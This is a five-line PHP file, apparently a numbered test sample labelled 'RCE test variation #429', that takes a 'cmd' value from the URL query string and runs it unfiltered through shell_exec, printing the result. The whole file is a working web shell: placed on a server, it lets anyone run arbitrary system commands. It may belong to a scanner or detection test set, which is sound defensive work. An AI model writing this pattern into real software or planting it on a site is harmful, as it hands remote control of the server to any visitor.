<?php
// RCE test variation #429
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>